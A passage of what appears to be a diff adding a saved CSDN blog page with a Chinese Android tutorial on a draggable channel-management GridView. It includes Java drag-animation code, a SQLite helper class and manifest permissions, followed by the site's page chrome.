+				| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+				| WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
+		this.windowParams.format = PixelFormat.TRANSLUCENT;
+		this.windowParams.windowAnimations = 0;
+		ImageView iv = new ImageView(getContext());
+		iv.setImageBitmap(dragBitmap);
+		windowManager = (WindowManager) getContext().getSystemService(
+				Context.WINDOW_SERVICE);// &quot;window&quot;
+		windowManager.addView(iv, windowParams);
+		dragImageView = iv;
+	}
+
+	/** 停止拖动 ，释放并初始化 */
+	private void stopDrag() {
+		if (dragImageView != null) {
+			windowManager.removeView(dragImageView);
+			dragImageView = null;
+		}
+	}
+
+	/** 在ScrollView内，所以要进行计算高度 */
+	@Override
+	public void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
+		int expandSpec = MeasureSpec.makeMeasureSpec(Integer.MAX_VALUE &gt;&gt; 2,
+				MeasureSpec.AT_MOST);
+		super.onMeasure(widthMeasureSpec, expandSpec);
+	}
+
+	/** 隐藏 放下 的ITEM */
+	private void hideDropItem() {
+		((DragAdapter) getAdapter()).setShowDropItem(false);
+	}
+
+	/** 获取移动动画 */
+	public Animation getMoveAnimation(float toXValue, float toYValue) {
+		TranslateAnimation mTranslateAnimation = new TranslateAnimation(
+				Animation.RELATIVE_TO_SELF, 0.0F, Animation.RELATIVE_TO_SELF,
+				toXValue, Animation.RELATIVE_TO_SELF, 0.0F,
+				Animation.RELATIVE_TO_SELF, toYValue);// 当前位置移动到指定位置
+		mTranslateAnimation.setFillAfter(true);// 设置一个动画效果执行完毕后，View对象保留在终止的位置。
+		mTranslateAnimation.setDuration(300L);
+		return mTranslateAnimation;
+	}
+
+	/** 移动的时候触发 */
+	public void OnMove(int x, int y) {
+		// 拖动的VIEW下方的POSTION
+		int dPosition = pointToPosition(x, y);
+		// 判断下方的POSTION是否是最开始2个不能拖动的
+		if (dPosition &gt; 1) {
+			if ((dPosition == -1) || (dPosition == dragPosition)) {
+				return;
+			}
+			dropPosition = dPosition;
+			if (dragPosition != startPosition) {
+				dragPosition = startPosition;
+			}
+			int movecount;
+			// 拖动的=开始拖的，并且 拖动的 不等于放下的
+			if ((dragPosition == startPosition)
+					|| (dragPosition != dropPosition)) {
+				// 移需要移动的动ITEM数量
+				movecount = dropPosition - dragPosition;
+			} else {
+				// 移需要移动的动ITEM数量为0
+				movecount = 0;
+			}
+			if (movecount == 0) {
+				return;
+			}
+
+			int movecount_abs = Math.abs(movecount);
+
+			if (dPosition != dragPosition) {
+				// dragGroup设置为不可见
+				ViewGroup dragGroup = (ViewGroup) getChildAt(dragPosition);
+				dragGroup.setVisibility(View.INVISIBLE);
+				float to_x = 1;// 当前下方positon
+				float to_y;// 当前下方右边positon
+				// x_vlaue移动的距离百分比（相对于自己长度的百分比）
+				float x_vlaue = ((float) mHorizontalSpacing / (float) itemWidth) + 1.0f;
+				// y_vlaue移动的距离百分比（相对于自己宽度的百分比）
+				float y_vlaue = ((float) mVerticalSpacing / (float) itemHeight) + 1.0f;
+				Log.d(&quot;x_vlaue&quot;, &quot;x_vlaue = &quot; + x_vlaue);
+				for (int i = 0; i &lt; movecount_abs; i++) {
+					to_x = x_vlaue;
+					to_y = y_vlaue;
+					// 像左
+					if (movecount &gt; 0) {
+						// 判断是不是同一行的
+						holdPosition = dragPosition + i + 1;
+						if (dragPosition / nColumns == holdPosition / nColumns) {
+							to_x = -x_vlaue;
+							to_y = 0;
+						} else if (holdPosition % 4 == 0) {
+							to_x = 3 * x_vlaue;
+							to_y = -y_vlaue;
+						} else {
+							to_x = -x_vlaue;
+							to_y = 0;
+						}
+					} else {
+						// 向右,下移到上，右移到左
+						holdPosition = dragPosition - i - 1;
+						if (dragPosition / nColumns == holdPosition / nColumns) {
+							to_x = x_vlaue;
+							to_y = 0;
+						} else if ((holdPosition + 1) % 4 == 0) {
+							to_x = -3 * x_vlaue;
+							to_y = y_vlaue;
+						} else {
+							to_x = x_vlaue;
+							to_y = 0;
+						}
+					}
+					ViewGroup moveViewGroup = (ViewGroup) getChildAt(holdPosition);
+					Animation moveAnimation = getMoveAnimation(to_x, to_y);
+					moveViewGroup.startAnimation(moveAnimation);
+					// 如果是最后一个移动的，那么设置他的最后个动画ID为LastAnimationID
+					if (holdPosition == dropPosition) {
+						LastAnimationID = moveAnimation.toString();
+					}
+					moveAnimation.setAnimationListener(new AnimationListener() {
+
+						@Override
+						public void onAnimationStart(Animation animation) {
+							// TODO Auto-generated method stub
+							isMoving = true;
+						}
+
+						@Override
+						public void onAnimationRepeat(Animation animation) {
+							// TODO Auto-generated method stub
+
+						}
+
+						@Override
+						public void onAnimationEnd(Animation animation) {
+							// TODO Auto-generated method stub
+							// 如果为最后个动画结束，那执行下面的方法
+							if (animation.toString().equalsIgnoreCase(
+									LastAnimationID)) {
+								DragAdapter mDragAdapter = (DragAdapter) getAdapter();
+								mDragAdapter.exchange(startPosition,
+										dropPosition);
+								startPosition = dropPosition;
+								dragPosition = dropPosition;
+								isMoving = false;
+							}
+						}
+					});
+				}
+			}
+		}
+	}
+}</pre>
+<div><br>
+</div>
+<span style="color:rgb(255,0,0)"><span style="font-family:Microsoft YaHei; font-size:24px">数据库SQLHelper文件</span></span></div>
+<div><pre code_snippet_id="327055" snippet_file_name="blog_20140505_4_3497250" name="code" class="java">public class SQLHelper extends SQLiteOpenHelper {
+	public static final String DB_NAME = &quot;database.db&quot;;// 数据库名称
+	public static final int VERSION = 1;
+	
+	public static final String TABLE_CHANNEL = &quot;channel&quot;;//数据表 
+
+	public static final String ID = &quot;id&quot;;//
+	public static final String NAME = &quot;name&quot;;
+	public static final String ORDERID = &quot;orderId&quot;;
+	public static final String SELECTED = &quot;selected&quot;;
+	private Context context;
+	public SQLHelper(Context context) {
+		super(context, DB_NAME, null, VERSION);
+		this.context = context;
+	}
+
+	public Context getContext(){
+		return context;
+	}
+	
+	@Override
+	public void onCreate(SQLiteDatabase db) {
+		// TODO 创建数据库后，对数据库的操作
+		String sql = &quot;create table if not exists &quot;+TABLE_CHANNEL +
+				&quot;(_id INTEGER PRIMARY KEY AUTOINCREMENT, &quot; +
+				ID + &quot; INTEGER , &quot; +
+				NAME + &quot; TEXT , &quot; +
+				ORDERID + &quot; INTEGER , &quot; +
+				SELECTED + &quot; SELECTED)&quot;;
+		db.execSQL(sql);
+	}
+
+	@Override
+	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
+		// TODO 更改数据库版本的操作
+		onCreate(db);
+	}
+
+}
+</pre>
+<div><br>
+</div>
+<span style="color:rgb(255,0,0)"><span style="font-family:Microsoft YaHei; font-size:24px">注：本DEMO中，加入了长按震动，所以在权限里面记得加上“</span></span></div>
+<div><pre code_snippet_id="327055" snippet_file_name="blog_20140505_5_8623226" name="code" class="java">    &lt;!-- 在SDCard中创建与删除文件权限 --&gt;
+    &lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot; /&gt;
+    &lt;!-- 往SDCard写入数据权限 --&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+    &lt;!-- 震动权限 --&gt;
+    &lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot;/&gt;</pre><br>
+<br>
+</div>
+<h1><span style="font-size:24px">六、源码下载</span></h1>
+<div><span style="font-size:18px">源码DEMO下载地址如下：<a target="_blank" target="_blank" href="http://download.csdn.net/detail/vipzjyno1/7295005"><span style="color:#cc0000">下载地址</span></a></span></div>
+<p><br>
+</p>
+   
+</div>
+
+
+
+
+<!-- Baidu Button BEGIN -->
+
+
+
+
+<div class="bdsharebuttonbox tracking-ad" style="float: right;" data-mod="popu_172">
+<a href="#" class="bds_more" data-cmd="more" style="background-position:0 0 !important; background-image: url(http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png) !important"></a>
+<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"  style="background-position:0 -52px !important"></a>
+<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"style="background-position:0 -104px !important"></a>
+<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"style="background-position:0 -260px !important"></a>
+<a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"style="background-position:0 -208px !important"></a>
+<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"style="background-position:0 -1612px !important" ></a>
+</div>
+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+<!-- Baidu Button END -->
+
+   <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_detail.css" />
+
+    
+<!--172.16.140.14-->
+
+<!-- Baidu Button BEGIN -->
+<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=1536434" ></script>
+<script type="text/javascript" id="bdshell_js"></script>
+<script type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</script>
+<!-- Baidu Button END -->
+
+ 
+
+
+        <div id="digg" ArticleId="25005851" >
+            <dl id="btnDigg" class="digg digg_disable"  onclick="btndigga();">
+               
+                 <dt>顶</dt>
+                <dd>90</dd>
+            </dl>
+           
+              
+            <dl id="btnBury" class="digg digg_disable"  onclick="btnburya();">
+              
+                  <dt>踩</dt>
+                <dd>1</dd>               
+            </dl>
+            
+        </div>
+     <div class="tracking-ad" data-mod="popu_222"><a href="javascript:void(0);" >&nbsp;</a>   </div>
+    <div class="tracking-ad" data-mod="popu_223"> <a href="javascript:void(0);" >&nbsp;</a></div>
+    <script type="text/javascript">
+                function btndigga() {
+                    $(".tracking-ad[data-mod='popu_222'] a").click();
+                }
+                function btnburya() {
+                    $(".tracking-ad[data-mod='popu_223'] a").click();
+                }
+            </script>
+
+   <ul class="article_next_prev">
+                <li class="prev_article"><span  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian']);location.href='/vipzjyno1/article/details/24664161';">上一篇</span><a href="/vipzjyno1/article/details/24664161" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian'])">Android 仿 窗帘效果 和 登录界面拖动效果  （Scroller类的应用） 附 2个DEMO及源码</a></li>
+                <li class="next_article"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian']);location.href='/vipzjyno1/article/details/25463457';">下一篇</span><a href="/vipzjyno1/article/details/25463457" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian'])">Activity启动模式 及 Intent Flags 与 栈 的关联分析</a></li>
+    </ul>
+
+    <div style="clear:both; height:10px;"></div>
+
+
+        <div class="similar_article"  style="display:none">
+                <h4>我的同类文章</h4>
+                <div class="similar_c"style="margin:20px 0px 0px 0px">
+                    <div class="similar_c_t">
+                                <label class="similar_cur">
+                                    <span  style="cursor:pointer"  onclick="GetCategoryArticles('2050837','vipzjyno1','foot','25005851');">android<em>（19）</em></span>
+                                </label>
+                    </div>
+                   
+                    <div class="similar_wrap tracking-ad" data-mod="popu_141"  style="max-height:195px;">
+                        <a href="http://blog.csdn.net" style="display:none">http://blog.csdn.net</a>
+                        <ul class="similar_list fl">                          
+                        </ul>
+
+                        <ul class="similar_list fr">                           
+                        </ul>
+                    </div>
+                </div>
+            </div>    
+    <script  type="text/javascript">
+        $(function () {
+            GetCategoryArticles('2050837', 'vipzjyno1','foot','25005851');
+        });
+    </script>
+      
+</div>
+
+     <div>
+             <ins data-revive-zoneid="206" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins> 
+    </div>
+
+<div id="suggest"></div>
+         <script  language="javascript" type='text/javascript'>     
+             $(function(){
+                 $.get("/vipzjyno1/svc/GetSuggestContent/25005851",function(data){
+                     $("#suggest").html(data);
+                 });     
+             });             
+         </script>  
+
+
+<style>
+.blog-ass-articl dd {
+color: #369;
+width: 99%; /*修改行*/
+float: left;
+overflow: hidden;
+font: normal normal 12px/23px "SimSun";
+height: 23px;
+margin: 0;
+padding: 0 0 0 10px;
+margin-right: 30px;
+background: url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;
+}
+</style>
+
+ <link rel="stylesheet" href="http://static.blog.csdn.net/css/replace.css"/>
+<div id="relate" data-mod="popu_218"  class="tracking-ad">
+        <div class="relate_t">
+            <h3><span>参考知识库</span></h3>
+        </div>
+        <div class="relate_c">
+        </div>
+</div>
+ 
+
+<dl class="blog-ass-articl" id="res-relatived" > 
+    <div class="embody embody_b" id="libkeyparent"  style="display:none">
+            <span class="embody_t">更多资料请参考：</span>
+            <div class="embody_c" id="libkey"></div>
+    </div>
+
+
+     <dt><span>猜你在找</span></dt>    
+
+
+   
+
+
+    <div id="adCollege" style="width: 42%;float: left;"> 
+        <script src="http://csdnimg.cn/jobreco/job_reco.js" type="text/javascript"></script> 
+        <script type="text/javascript">
+            csdn.position.showEdu({
+                sourceType: "blog",
+                searchType: "detail",
+                searchKey: "25005851",
+                username: "",
+                recordcount: "5",
+                containerId: "adCollege" //容器DIV的id。 
+            });
+            
+            setEduLoc();
+
+            function setEduLoc() {               
+                var edus = $("#adCollege div dd a");
+                if (edus.length == 0) {
+                    setTimeout(function () {
+                        setEduLoc();
+                    }, 500);
+                }
+                else {
+                    var eduLoc = "?ref=blog&loc=0";
+                    $.each(edus, function (index,item) {
+                        var href = $(this).attr("href") + eduLoc;
+                        $(this).attr("href", href);
+                    });
+                }
+            }
+
+        </script> 
+    </div>  
+
+    
+     <div id="res"  data-mod="popu_36"  class="tracking-ad" style="width: 42%;float: left;margin-right: 30px;"></div>
+   
+</dl>
+
+
+<script type="text/javascript">
+    $(function () {
+        setTimeout(function () {
+            var searchtitletags = 'Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO' + ',' + $("#tags").html();
+            searchService({
+                index: 'blog',
+                query: searchtitletags,
+                from: 5,
+                size: 5,
+                appendTo: '#res',
+                url: 'recommend',
+                his: 2,
+                client: "blog_cf_enhance",
+                tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+            });
+        }, 500);
+    });    
+
+ </script>  
+
+
+    <div id="ad_cen">        
+                      <ins data-revive-zoneid="199" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    </div>  
+
+    <!-- 广告位开始 -->
+    <ins data-revive-zoneid="72" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    <!-- 广告位结束 -->
+
+<div class="comment_class">
+    <div id="comment_title" class="panel_head">
+        <span class="see_comment">查看评论</span><a name="comments"></a></div>
+    <div id="comment_list">
+    </div>
+    <div id="comment_bar">
+    </div>
+    <div id="comment_form">
+    </div>
+    <div class="announce">
+        * 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<a name="reply"></a><a name="quote"></a></div>
+</div>
+
+<script type="text/javascript">
+    var fileName = '25005851';
+    var commentscount = 59;
+    var islock = false
+</script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/comment.js"></script>
+    <div id="ad_bot">
+    </div>
+<div id="report_dialog">
+</div>
+
+<div id="d-top"  style="bottom:60px;">
+
+        <a id="quick-reply" class="btn btn-top q-reply" title="快速回复" style="display:none;">
+            <img src="http://static.blog.csdn.net/images/blog-icon-reply.png" alt="快速回复">
+        </a>    
+    <a id="d-top-a" class="btn btn-top backtop"  style="display: none;" title="返回顶部" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_huidaodingbu'])" style="">         
+         <img src="http://static.blog.csdn.net/images/top.png" alt="TOP">
+    </a>
+</div>
+<script type="text/javascript">
+    $(function ()
+    {
+        $("#ad_frm_0").height("90px");
+        
+        setTimeout(function(){
+            $("#ad_frm_2").height("200px");
+        },1000);    
+    });
+  
+</script>
+<style type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
+</style>
+
+
+<div class="tag_list" style="display:none"></div>
+  <script  language="javascript" type='text/javascript'>     
+      $(function(){
+              setTimeout(function(){
+                  $.get("/vipzjyno1/svc/GetTagContent",function(data){
+                      $(".tag_list").html(data).show();
+                  });     
+              });
+          },500);                       
+ </script> 
+
+
+<div id="pop_win" style="display:none ;position: absolute; z-index: 10000; border: 1px solid rgb(220, 220, 220); top: 222.5px; left: 630px; opacity: 1; background: none 0px 0px repeat scroll rgb(255, 255, 255);">
+    
+</div>
+<div id="popup_mask"></div>
+<style>
+    #popup_mask
+    {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        z-index: 9999;
+        left: 0px;
+        top: 0px;
+        opacity: 0.3;
+        filter: alpha(opacity=30);
+        display: none;
+    }
+
+</style>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function(){
+            $(".comment_body:contains('回复')").each(function(index,item){
+                var u=$(this).text().split('：')[0].toString().replace("回复","")
+                var thisComment=$(this);
+                if(u)
+                {
+                    $.getJSON("https://passport.csdn.net/get/nick?callback=?", {users: u}, function(a) {
+                        if(a!=null&&a.data!=null&&a.data.length>0)
+                        {
+                            nick=a.data[0].n; 
+                            if(u!=nick)
+                            {
+                                thisComment.text(thisComment.text().replace(u,nick));  
+                            }
+                        }       
+                    });  
+                }
+            });         
+
+        },200);  
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },5000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },10000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },15000);
+        
+        setTimeout(function(){
+            $("a img[src='http://js.tongji.linezing.com/stats.gif']").parent().css({"position":"absolute","left":"50%"});
+        },300);
+    });
+
+    function loginbox(){
+        var $logpop=$("#pop_win");
+        $logpop.html('<iframe src="https://passport.csdn.net/account/loginbox?service=http://static.blog.csdn.net/callback.htm" frameborder="0" height="600" width="400" scrolling="no"></iframe>');
+
+        $('#popup_mask').css({
+            opacity: 0.5,
+            width: $( document ).width() + 'px',
+            height:  $( document ).height() + 'px'
+        });
+        $('#popup_mask').css("display","block");
+ 
+        $logpop.css( {
+            top: ($( window ).height() - $logpop.height())/ 2  + $( window 
+       ).scrollTop() + 'px',
+            left:($( window ).width() - $logpop.width())/ 2
+        } );
+ 
+        setTimeout( function () {
+            $logpop.show();
+            $logpop.css( {
+                opacity: 1
+            } );
+        }, 200 );
+ 
+        $('#popup_mask').unbind("click");
+        $('#popup_mask').bind("click", function(){
+            $('#popup_mask').hide();
+            var $clopop = $("#pop_win");
+            $("#common_ask_div_sc").css("display","none");
+            $clopop.css( {
+                opacity: 0
+            } );
+            setTimeout( function () {
+                $clopop.hide();
+            }, 350 );
+            return false;
+        });
+    }   
+
+</script>
+ <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/async_new.js"></script>      
+
+
+
+
+                        <div class="clear">
+                        </div>
+                    </div>                   
+                
+            </div>
+                   
+           <div id="side">
+               
+    <div class="side">
+<div id="panel_Profile" class="panel">
+<ul class="panel_head"><span>个人资料</span></ul>
+<ul class="panel_body profile">
+<div id="blog_userface">
+    <a href="http://my.csdn.net/vipzjyno1" target="_blank">
+    <img src="http://avatar.csdn.net/0/0/D/1_vipzjyno1.jpg" title="访问我的空间" style="max-width:90%"/>
+    </a>
+    <br />
+    <span><a href="http://my.csdn.net/vipzjyno1" class="user_name" target="_blank">vipzjyno1</a></span>
+</div>
+<div class="interact">
+
+    <a href="javascript:void(0);" class="attent" id="span_add_follow" title="[加关注]"></a>
+
+ <a href="javascript:void(0);" class="letter"  title="[发私信]" onclick="window.open('http://msg.csdn.net/letters/model?receiver=vipzjyno1','_blank','height=350,width=700');_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_sixin'])"></a>  
+</div>
+<div id="blog_medal">
+                <div id="bms_box">
+               </div>
+</div>
+<ul id="blog_rank">
+    <li>访问：<span>1773314次</span></li>
+    <li>积分：<span>5914</span> </li>    
+    <li >等级： <span style="position:relative;display:inline-block;z-index:1" >
+            <img src="http://c.csdnimg.cn/jifen/images/xunzhang/jianzhang/blog6.png" alt="" style="vertical-align: middle;" id="leveImg">
+            <div id="smallTittle" style=" position: absolute;  left: -24px;  top: 25px;  text-align: center;  width: 101px;  height: 32px;  background-color: #fff;  line-height: 32px;  border: 2px #DDDDDD solid;  box-shadow: 0px 2px 2px rgba (0,0,0,0.1);  display: none;   z-index: 999;">
+            <div style="left: 42%;  top: -8px;  position: absolute;  width: 0;  height: 0;  border-left: 10px solid transparent;  border-right: 10px solid transparent;  border-bottom: 8px solid #EAEAEA;"></div>
+            积分：5914 </div>
+        </span>  </li>
+    <li>排名：<span>第3567名</span></li>
+</ul>
+<ul id="blog_statistics">
+    <li>原创：<span>22篇</span></li>
+    <li>转载：<span>7篇</span></li>
+    <li>译文：<span>0篇</span></li>
+    <li>评论：<span>1024条</span></li>
+</ul>
+</ul>
+</div>
+
+
+
+
+<div id="custom_column_39255421" class="panel">
+<ul class="panel_head"><span>Github，爱开源、分享</span></ul>
+<ul class="panel_body">
+
+<li style="padding:3px"><a target="_blank" href="https://github.com/Rano1"><font color="red" size="2">https://github.com/Rano1</font></a>
+</li>
+</ul>
+</div><div id="panel_Category" class="panel">
+<ul class="panel_head"><span>文章分类</span></ul>
+<ul class="panel_body">    
+                 <li>
+                    <a href="/vipzjyno1/article/category/2050593" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">转载</a><span>(7)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/1922005" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">感悟期望</a><span>(2)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/888110" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">疑问</a><span>(0)</span>
+                </li>
+                 <li>
+                    <a href="/vipzjyno1/article/category/2050837" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">android</a><span>(20)</span>
+                </li>
+</ul>
+</div><div id="panel_Archive" class="panel">
+<ul class="panel_head"><span>文章存档</span></ul>
+<ul class="panel_body">
+<div id="archive_list">
+<!--归档统计-->
+<li><a href="/vipzjyno1/article/month/2014/05">2014年05月</a><span>(6)</span></li><li><a href="/vipzjyno1/article/month/2014/04">2014年04月</a><span>(14)</span></li><li><a href="/vipzjyno1/article/month/2014/03">2014年03月</a><span>(8)</span></li><li><a href="/vipzjyno1/article/month/2014/02">2014年02月</a><span>(1)</span></li>
+</div>
+</ul>
+</div>
+<div id="hotarticls" class="panel">
+<ul class="panel_head">
+    <span>       
+阅读排行    </span>
+</ul>
+
+<ul class="panel_body itemlist">
+<li>
+<a href="/vipzjyno1/article/details/21039349" title="Android APK反编译就这么简单  详解（附图）">Android APK反编译就这么简单  详解（附图）</a><span>(661995)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25248021" title="Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a><span>(177575)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23206387" title="Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a><span>(168700)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23542617" title="Android 命名规范 （提高代码可以读性）">Android 命名规范 （提高代码可以读性）</a><span>(89966)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23707149" title="SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）">SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）</a><span>(76681)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/21042823" title="Android如何防止apk程序被反编译">Android如何防止apk程序被反编译</a><span>(52890)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/26514543" title="（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇">（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇</a><span>(51728)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23614675" title="Android SlidingMenu 开源项目 侧拉菜单的使用（详细配置）">Android SlidingMenu 开源项目 侧拉菜单的使用（详细配置）</a><span>(48020)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23696537" title="android  自定义控件 使用declare-styleable进行配置属性（源码角度）">android  自定义控件 使用declare-styleable进行配置属性（源码角度）</a><span>(44883)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/22098621" title="GitHub超详细图文攻略 - Git客户端下载安装 GitHub提交修改源码工作流程 Git分支 标签 过滤 Git版本工作流">GitHub超详细图文攻略 - Git客户端下载安装 GitHub提交修改源码工作流程 Git分支 标签 过滤 Git版本工作流</a><span>(39690)</span>
+</li>
+</ul>
+</div>
+<div id="hotarticls2" class="panel">
+<ul class="panel_head"><span>评论排行</span></ul>
+<ul class="panel_body itemlist">
+<li>
+<a href="/vipzjyno1/article/details/21039349" title="Android APK反编译就这么简单  详解（附图）">Android APK反编译就这么简单  详解（附图）</a><span>(177)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/26514543" title="（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇">（android高仿系列）今日头条 --新闻阅读器 （三） 完结 、总结 篇</a><span>(129)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25248021" title="Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a><span>(127)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23206387" title="Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a><span>(101)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23619269" title="（android高仿系列）今日头条 --新闻阅读器 （二）">（android高仿系列）今日头条 --新闻阅读器 （二）</a><span>(83)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/25005851" title="Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO">Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO</a><span>(59)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/19763963" title="一个菜鸟对于过去和未来的感悟和展望">一个菜鸟对于过去和未来的感悟和展望</a><span>(46)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23707149" title="SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）">SwitchButton 开关按钮 的多种实现方式  （附源码DEMO）</a><span>(45)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/23591315" title="（android高仿系列）今日头条 --新闻阅读器  （一）">（android高仿系列）今日头条 --新闻阅读器  （一）</a><span>(34)</span>
+</li>
+<li>
+<a href="/vipzjyno1/article/details/24664161" title="Android 仿 窗帘效果 和 登录界面拖动效果  （Scroller类的应用） 附 2个DEMO及源码">Android 仿 窗帘效果 和 登录界面拖动效果  （Scroller类的应用） 附 2个DEMO及源码</a><span>(33)</span>
+</li>
+</ul>
+</div>
+<div id="homepageArticles" class="panel tracking-ad" data-mod="popu_4">
+<ul class="panel_head"><span>推荐文章</span></ul>
+<ul class="panel_body" id="ad_commend">
+<ul>
+<li><a href="http://blog.csdn.net/cyq1162/article/details/64919386" target="_blank">* 一个想法照进现实-《IT连》创业项目：关于团队组建</a></li>
+<li><a href="http://blog.csdn.net/blogdevteam/article/details/65446094" target="_blank">* CSDN日报20170323——《你首先是一个人，然后你才是程序员》</a></li>
+<li><a href="http://blog.csdn.net/carson_ho/article/details/64904691" 
+target="_blank">* 最全面总结 Android WebView与 JS 的交互方式</a></li>
+<li><a href="http://blog.csdn.net/yueqian_scut/article/details/62229262"target="_blank">*  蓝牙DA14580开发：固件格式、二次引导和烧写</a></li>
+<li><a href="http://blog.csdn.net/carson_ho/article/details/64904635" 
+target="_blank">* 你不知道的 Android WebView 使用漏洞</a></li>
+
+
+</ul></ul>
+</div>
+
+
+<div id="newcomments" class="panel">
+<ul class="panel_head"><span>最新评论</span></ul>
+<ul class="panel_body itemlist">
+    <li>
+   
+         <a href="/vipzjyno1/article/details/21039349#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/qq_29257945" class="user_name">qq_29257945</a>:
+亲测可用，谢谢楼主分享，顶一个
+    </p>
+    </li>
+    <li>
+   
